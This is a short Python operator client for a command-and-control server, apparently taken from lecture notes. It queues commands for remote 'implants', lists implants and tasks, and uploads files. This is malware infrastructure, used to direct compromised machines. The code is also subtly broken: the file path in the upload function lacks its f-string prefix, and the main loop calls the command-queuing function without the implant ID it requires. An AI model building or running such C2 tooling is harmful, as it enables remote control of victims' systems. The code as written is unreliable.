###from lecture notes

import requests 

c2_server = "http://0.0.0.0:8080"
path = "/secret"
filepath = "/files/"

def queue_cmd(cmd, agent_id):
    r = requests.post(f"{c2_server}{path}", json=[{"implant_id": agent_id, "cmd": cmd}])
    if r.text == "True":
        print("queued ")
    else:
        print("failed")


# checks the status of our task queue 
def print_queue():
    r = requests.get(f"{c2_server}/queue")
    if r.status_code == 200:
        print(r.json())
    else:
        print("error")

def print_implants():
    r = requests.get(f"{c2_server}/implants")
    if r.status_code == 200:
        print(r.json())
    else:
        print("error")
        
def upload_file(localpath, filename):
    print("make sure the file you're trying to upload is in the correct directory and exists")
    dfiles = open("{localpath}{filename}", "r")
    data = dfiles.read()  
    dfiles.close()
    r = requests.post(f"{c2_server}{filepath}{filename}", json=[{"file_contents":data}])


if __name__ == "__main__":
    while True:
        cmd = input(">>")
        if cmd == "q":
            print_queue()
        elif cmd == "i":
            print_implants()
        elif "sid" in cmd:
            implant_id = cmd.split(" ")[1]

        elif cmd == "\n":
            continue
        else:
            queue_cmd(cmd)